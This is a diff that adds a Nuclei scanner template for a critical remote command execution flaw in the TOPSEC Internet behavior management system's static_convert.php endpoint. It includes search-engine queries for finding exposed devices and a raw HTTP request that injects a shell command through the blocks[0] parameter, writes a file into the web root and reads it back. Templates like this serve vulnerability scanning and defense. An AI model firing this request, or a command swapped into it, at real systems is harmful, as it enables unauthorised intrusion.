@@ -1,0 +1,41 @@
+id: topsec_ibms_static_convert_rce
+
+info:
+  name: 天融信TOPSEC static_convert 远程命令执行
+  author: Anonymous
+  severity: critical
+  description: 天融信TOPSEC 上网行为管理系统 static_convert  接口处存在 RCE 漏洞
+  metadata:
+    max-request: 1
+    fofa-query: app="天融信-上网行为管理系统"
+    quake-query: app:"天融信 上网行为管理系统"
+    verified: true
+tags: rce,topsec,network,hw
+
+variables:
+  verifystr: '{{rand_base(5)}}'
+  cmd: 'echo+"{{verifystr}}"'
+  filename: '{{to_lower(rand_base(5))}}'
+
+
+http:
+  - raw:
+      - |
+        GET /view/IPV6/naborTable/static_convert.php?blocks[0]=||{{cmd}}>>%20/var/www/html/{{filename}}.txt%0A HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
+
+      - |
+        GET /{{filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1==200
+          - contains(body_2, '{{verifystr}}')
+          - status_code_2==200
+        condition: and
+# cmd 需要url编码
+# digest: 4a0a0047304502207aac292fbe2b5713eeb24258c5ab1dba861b9117d78f6e083ddab65508cdf1a8022100ef1a70bc4ab2687495e2d81c6cfe47a50b5f219780ca5a3cb90eb94f219c540f:6b2dd5af372f02ed15a56faf8ad98cf9
